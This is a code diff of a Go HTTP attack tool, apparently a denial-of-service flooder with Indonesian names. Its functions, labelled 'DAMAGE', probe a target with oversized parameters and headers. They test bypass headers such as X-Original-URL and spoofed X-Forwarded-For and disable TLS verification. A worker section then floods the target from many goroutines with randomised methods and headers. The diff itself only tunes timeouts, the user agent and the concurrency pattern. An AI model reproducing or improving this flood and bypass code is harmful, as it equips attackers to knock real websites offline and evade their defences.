@@ -236,10 +236,10 @@ var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 // ================== DAMAGE 1 ==================
 func PMP(target string) int {
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
-sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
+sizes := []int{64, 128, 256, 512}
 Berhasil := 0
 for _, size := range sizes {
 testURL := target
@@ -248,7 +248,7 @@ testURL += "&big=" + strings.Repeat("x", size)
 } else {
 testURL += "?big=" + strings.Repeat("x", size)}
 req, _ := http.NewRequest("GET", testURL, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 resp, err := client.Do(req)
 if err != nil {
 break
@@ -267,14 +267,14 @@ return Berhasil
 // ================== DAMAGE 2 ==================
 func PMH(target string) int {
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
-sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
+sizes := []int{512, 1024, 2048, 4096}
 Berhasil := 0
 for _, size := range sizes {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 req.Header.Set("X-Large-Data", strings.Repeat("x", size))
 resp, err := client.Do(req)
 if err != nil {
@@ -294,7 +294,7 @@ return Berhasil
 // ================== DAMAGE 3 ==================
 func PHR(target string, ProxyX string) map[string]bool {
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 parsedTarget, _ := url.Parse(target)
@@ -316,7 +316,7 @@ HeadersBypas := []string{
 result := make(map[string]bool)
 for _, h := range HeadersBypas {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 switch h {
 case "X-Original-URL":
 req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
@@ -379,12 +379,12 @@ candidates := []string{
 }
 var valid []string
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, origin := range candidates {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 if origin != "" {
 req.Header.Set("Origin", origin)}
 resp, err := client.Do(req)
@@ -409,7 +409,7 @@ testUAs := []string{
 "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",}
 var valid []string
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ua := range testUAs {
@@ -440,12 +440,12 @@ testReferers := []string{
 }
 var valid []string
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ref := range testReferers {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 if ref != "" {
 req.Header.Set("Referer", ref)}
 resp, err := client.Do(req)
@@ -468,12 +468,12 @@ if p != "" {
 testIPs = append(testIPs, p)}}
 var valid []string
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ip := range testIPs {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 req.Header.Set("X-Forwarded-For", ip)
 resp, err := client.Do(req)
 if err != nil {
@@ -492,7 +492,7 @@ func HMETHOD(target string) []string {
 methods := []string{"GET", "POST", "OPTIONS"}
 var valid []string
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, method := range methods {
@@ -500,7 +500,7 @@ req, _ := http.NewRequest(method, target, nil)
 if method == "POST" {
 req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 req.Body = io.NopCloser(strings.NewReader(""))}
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 resp, err := client.Do(req)
 if err != nil {
 continue
@@ -518,12 +518,12 @@ func ENCOD(target string) []string {
 encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
 var valid []string
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, enc := range encodings {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 req.Header.Set("Accept-Encoding", enc)
 resp, err := client.Do(req)
 if err != nil {
@@ -542,12 +542,12 @@ func CACH(target string) []string {
 controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
 var valid []string
 client := &http.Client{
-Timeout: 5 * time.Second,
+Timeout: 3 * time.Second,
 Transport: &http.Transport{
 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, cc := range controls {
 req, _ := http.NewRequest("GET", target, nil)
-req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("User-Agent", "curl/8")
 req.Header.Set("Cache-Control", cc)
 resp, err := client.Do(req)
 if err != nil {
@@ -658,40 +658,20 @@ proxyIPs = append(proxyIPs, p.Hostname())}}
 if len(proxyIPs) > 0 {
 ProxyX = proxyIPs[0]}
 
-// ================== BYPASS PARALEL ==================
+// ================== BYPASS ==================
 fmt.Printf("%s▶ Proses Bypass!%s\n", IJO, HAPUS)
+MaxP := PMP(tgt)
+MaxHead := PMH(tgt)
+Supported := PHR(tgt, ProxyX)
 
-var wg sync.WaitGroup
-wg.Add(11)
-
-var MaxP, MaxHead int
-var Supported map[string]bool
-var HVERSI string
-var VORI, VUAS, VREF, VIPS []string
-var VMET, VENC, VCAC []string
-
-go func() { defer wg.Done(); MaxP = PMP(tgt) }()
-go func() { defer wg.Done(); MaxHead = PMH(tgt) }()
-go func() { defer wg.Done(); Supported = PHR(tgt, ProxyX) }()
-go func() { defer wg.Done(); HVERSI = HSUPPORT(tgt) }()
-go func() { defer wg.Done(); VORI = ORIGIN(tgt) }()
-go func() { defer wg.Done(); VUAS = UA_TEST(tgt) }()
-go func() { defer wg.Done(); VREF = REFFERER(tgt) }()
-go func() { defer wg.Done(); VIPS = PPHEAD(tgt, proxyIPs) }()
-go func() { defer wg.Done(); VMET = HMETHOD(tgt) }()
-go func() { defer wg.Done(); VENC = ENCOD(tgt) }()
-go func() { defer wg.Done(); VCAC = CACH(tgt) }()
-
-wg.Wait()
-
-// ================== FALLBACK (biar gak panic) ==================
-if len(VMET) == 0 { VMET = []string{"GET"} }
-if len(VUAS) == 0 { VUAS = []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"} }
-if len(VREF) == 0 { VREF = []string{"https://www.google.com/"} }
-if len(VENC) == 0 { VENC = []string{"gzip, deflate, br"} }
-if len(VCAC) == 0 { VCAC = []string{"no-cache"} }
-if len(VIPS) == 0 { VIPS = []string{"127.0.0.1"} }
-if len(VORI) == 0 { VORI = []string{"https://" + host} }
+HVERSI := HSUPPORT(tgt)
+VORI := ORIGIN(tgt)
+VUAS := UA_TEST(tgt)
+VREF := REFFERER(tgt)
+VIPS := PPHEAD(tgt, proxyIPs)
+VMET := HMETHOD(tgt)
+VENC := ENCOD(tgt)
+VCAC := CACH(tgt)
 
 PRLT := PREST{
 VOR: VORI,
@@ -820,17 +800,17 @@ PUTIH, HAPUS,
 MERAH, HAPUS,
 PUTIH, elapsed, dur, HAPUS,
 MERAH, IJO, "True", MERAH)}}}()
-var wg2 sync.WaitGroup
+var wg sync.WaitGroup
 if dur > 0 {
 time.AfterFunc(time.Duration(dur)*time.Second, func() {
 cancel()})}
 
 // ================== WORKER ==================
 for i := 0; i < Speed; i++ {
-wg2.Add(1)
+wg.Add(1)
 c := wcs[i%len(wcs)]
 go func(cli CLI, workerID int) {
-defer wg2.Done()
+defer wg.Done()
 rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
 for ctx.Err() == nil {
 method := VMET[rng.Intn(len(VMET))]
@@ -973,5 +953,5 @@ select {
 case <-sig:
 cancel()
 case <-ctx.Done():}
-wg2.Wait()
+wg.Wait()
 fmt.Println()}
